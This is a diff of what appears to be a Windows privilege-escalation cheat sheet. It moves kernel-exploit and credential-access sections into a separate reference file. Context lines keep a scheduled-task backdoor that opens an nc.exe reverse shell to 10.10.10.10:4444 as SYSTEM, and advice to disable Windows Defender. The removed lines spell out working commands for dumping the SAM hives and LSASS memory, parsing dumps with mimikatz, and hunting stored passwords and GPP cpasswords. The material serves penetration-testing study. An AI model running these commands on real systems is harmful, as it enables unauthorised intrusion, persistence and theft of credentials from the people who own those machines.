@@ -303,114 +303,13 @@ schtasks /create /tn "Backdoor" /tr "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"
 schtasks /create /tn "Backdoor" /tr "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe" /sc minute /mo 1 /ru System
 ```
 
-### 8. Kernel Exploits
+### 8. Kernel Exploits & Credential Access
 
-**Identify Windows Version:**
-```cmd
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
-wmic os get Caption,CSDVersion,OSArchitecture,Version
-```
-
-**Check Installed Patches:**
-```cmd
-wmic qfe list
-wmic qfe get Caption,Description,HotFixID,InstalledOn
-```
-
-**Common Windows Exploits:**
-```cmd
-# MS16-032 - Secondary Logon Handle (Windows 7-10, Server 2008-2012)
-# MS17-010 - EternalBlue (Windows 7-10, Server 2008-2016)
-# CVE-2021-1675 - PrintNightmare (Windows 7-11, Server 2008-2022)
-# CVE-2021-36934 - HiveNightmare/SeriousSAM (Windows 10)
-
-# Search exploits
-searchsploit windows kernel | grep -i "privilege escalation"
-```
-
-**Windows Exploit Suggester:**
-```bash
-# On Linux
-python windows-exploit-suggester.py --database 2021-09-01-mssb.xls --systeminfo systeminfo.txt
-```
-
-### 9. Credential Access
-
-**SAM/SYSTEM Dumping:**
-```cmd
-# Save registry hives (requires admin)
-reg save HKLM\SAM C:\Temp\sam.hive
-reg save HKLM\SYSTEM C:\Temp\system.hive
-reg save HKLM\SECURITY C:\Temp\security.hive
-
-# Extract hashes (on Linux)
-samdump2 system.hive sam.hive
-secretsdump.py -sam sam.hive -system system.hive LOCAL
-
-# Volume Shadow Copy (requires admin)
-vssadmin list shadows
-vssadmin create shadow /for=C:
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\sam
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\system
-```
-
-**LSASS Dumping:**
-```cmd
-# Task Manager method (GUI)
-# Find lsass.exe -> Create Dump File
-
-# procdump (Sysinternals)
-procdump.exe -accepteula -ma lsass.exe lsass.dmp
-
-# comsvcs.dll method
-tasklist | findstr lsass
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
-
-# Parse dump with mimikatz (offline)
-sekurlsa::minidump lsass.dmp
-sekurlsa::logonpasswords
-```
-
-**Search for Passwords:**
-```cmd
-# Files containing password strings
-findstr /si password *.txt *.xml *.ini *.config
-findstr /si password C:\*.txt C:\*.xml C:\*.ini
-
-# Unattend files
-dir /s *unattend.xml
-type C:\Windows\Panther\Unattend.xml
-type C:\Windows\Panther\Unattended.xml
-
-# PowerShell history
-type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-
-# IIS web.config
-type C:\inetpub\wwwroot\web.config
-type C:\Windows\System32\inetsrv\config\applicationHost.config
-
-# Saved credentials in registry
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
-```
-
-### 10. Group Policy Preferences (GPP)
-
-**Search for GPP Files:**
-```cmd
-# Find GPP XML files containing passwords
-findstr /S /I cpassword \\<DOMAIN>\sysvol\<DOMAIN>\policies\*.xml
-
-# Decrypt cpassword
-gpp-decrypt <cpassword_value>
-```
-
-```powershell
-# PowerShell
-Get-GPPPassword
-Get-CachedGPPPassword
-```
+Once you have a foothold, kernel exploitation and credential harvesting are
+covered as an exhaustive command catalog in a dedicated reference: kernel
+exploit identification and suggesters, SAM/SYSTEM and LSASS dumping,
+on-disk/registry password hunting, and Group Policy Preferences (GPP)
+extraction. See [references/kernel-exploits-and-credential-access.md](references/kernel-exploits-and-credential-access.md).
 
 ## Automated Enumeration Tools
 
@@ -487,8 +386,9 @@ Invoke-PrivescCheck -Extended
 - Disable Windows Defender (if admin)
 - Use living-off-the-land binaries (LOLBins)
 
-## Reference Links
+## References
 
+- [references/kernel-exploits-and-credential-access.md](references/kernel-exploits-and-credential-access.md) — Kernel exploit and credential-access command catalog (progressive disclosure)
 - HackTricks Windows Privesc: https://github.com/HackTricks-wiki/hacktricks/tree/master/src/windows-hardening
 - PEASS-ng (WinPEAS): https://github.com/carlospolop/PEASS-ng
 - PowerSploit (PowerUp): https://github.com/PowerShellMafia/PowerSploit
